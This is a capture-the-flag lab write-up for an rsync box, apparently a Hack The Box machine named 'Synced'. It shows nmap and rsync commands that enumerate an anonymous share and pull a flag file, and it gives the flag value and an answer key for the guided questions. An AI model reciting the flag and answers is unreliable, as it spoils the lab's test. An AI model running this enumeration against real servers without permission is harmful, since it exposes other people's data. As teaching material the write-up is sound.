# Synced

|            |                                                              |
|------------|--------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                      |
| Difficulty | Very Easy                                                    |
| OS         | Linux                                                        |
| Tags       | Rsync, Network, Protocols, Reconnaissance, Anonymous Access  |
| Tools      | `nmap`, `rsync`                                              |

## Summary

rsync daemon on its default port with anonymous read access to a `public`
share. The trick is treating rsync as a service to enumerate, not just a copy
tool: `--list-only` against a bare `rsync://` URL is the equivalent of
`smbclient -L` for SMB.

## Solve

```bash
nmap -sV -p 873 10.129.97.233
# 873/tcp open  rsync   (protocol version 31)

# Enumerate exposed modules
rsync --list-only rsync://10.129.97.233
# public          Anonymous Share

# List what's in it
rsync --list-only rsync://10.129.97.233/public
# -rw-r--r--   33  2022/10/25 08:32:03 flag.txt

# Pull the flag
rsync rsync://10.129.97.233/public/flag.txt ./flag.txt

cat flag.txt
72eaf5344ebb84908ae543a719830519
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What is the default port for rsync? | 873 |
| 2 | How many TCP ports are open on the remote host? | 1 |
| 3 | What is the protocol version used by rsync on the remote machine? | 31 |
| 4 | What is the most common command name on Linux to interact with rsync? | rsync |
| 5 | What credentials do you have to pass to rsync in order to use anonymous authentication? | None |
| 6 | What is the option to only list shares and files on rsync? | list-only |
